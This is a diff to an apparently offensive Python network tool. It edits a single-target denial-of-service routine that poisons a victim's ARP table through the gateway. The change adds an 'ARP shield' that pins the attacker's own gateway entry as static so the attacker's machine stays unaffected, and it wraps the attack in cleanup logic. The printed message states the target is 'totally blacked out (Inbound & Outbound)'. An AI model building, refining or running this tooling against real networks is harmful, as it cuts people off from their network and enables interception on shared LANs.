@@ -225,6 +225,8 @@ def arp_spoof(*, target_ip, iface, do_save=False, dns_domain=None, dns_ip=None):
         console.print()
 
 def run_single_dos(*, target_ip, iface):
+    from utils import set_static_arp, remove_static_arp
+    
     console.print()
     console.print(Rule(title="[info_bold]Starting Single Target DoS Attack...[/]", style="border"))
     
@@ -247,27 +249,38 @@ def run_single_dos(*, target_ip, iface):
         print_error_panel(f"Could not resolve MAC address for gateway {gateway_ip}. Aborting to ensure restoration safety.")
         sys.exit(1)
         
-    target = models.Host(ip_address=target_ip, mac_address=target_mac)
-    dos_attack = attacks.SingleTargetDos(
-        target=target, 
-        gateway_ip=gateway_ip, 
-        gateway_mac=gateway_mac,
-        iface=iface
-    )
-    
-    console.print(f"[highlight]Target:[/highlight] [info]{target_ip}[/] [muted_light]->[/] {target_mac}")
-    console.print(f"[highlight]Gateway:[/highlight] [info]{gateway_ip}[/] [muted_light]->[/] {gateway_mac}")
-    
-    dos_attack.start()
-    console.print("\n[success_bold]Attack is running![/] [muted]Poisoning target to disrupt connection.[/]")
+    # --- ARP SHIELD START ---
+    # Set a static ARP entry for our gateway so our machine ignores the spoofed packets
+    console.print(f"[muted]Shielding local ARP cache for gateway [info]{gateway_ip}[/]...[/]")
+    set_static_arp(iface, gateway_ip, gateway_mac)
     
     try:
+        target = models.Host(ip_address=target_ip, mac_address=target_mac)
+        dos_attack = attacks.SingleTargetDos(
+            target=target, 
+            gateway_ip=gateway_ip, 
+            gateway_mac=gateway_mac,
+            iface=iface
+        )
+        
+        console.print(f"[highlight]Target:[/highlight] [info]{target_ip}[/] [muted_light]->[/] {target_mac}")
+        console.print(f"[highlight]Gateway:[/highlight] [info]{gateway_ip}[/] [muted_light]->[/] {gateway_mac}")
+        
+        dos_attack.start()
+        console.print("\n[success_bold]Attack is running![/] [muted]Target is totally blacked out (Inbound & Outbound).[/]")
+        
         console.input("\n[info_bold]Press ENTER to stop the attack...[/]\n")
     except KeyboardInterrupt:
         console.print()
     finally:
-        console.print("[warning]Stopping DoS attack and restoring target ARP table...[/]")
-        dos_attack.stop()
+        # --- ARP SHIELD END ---
+        console.print("[warning]Stopping DoS attack and restoring network tables...[/]")
+        if 'dos_attack' in locals():
+            dos_attack.stop()
+            
+        console.print(f"[muted]Reverting local gateway ARP to dynamic...[/]")
+        remove_static_arp(iface, gateway_ip)
+        
         console.print(Rule(title="[info_bold]Attack Stopped[/]", style="border"))
         console.print()
 
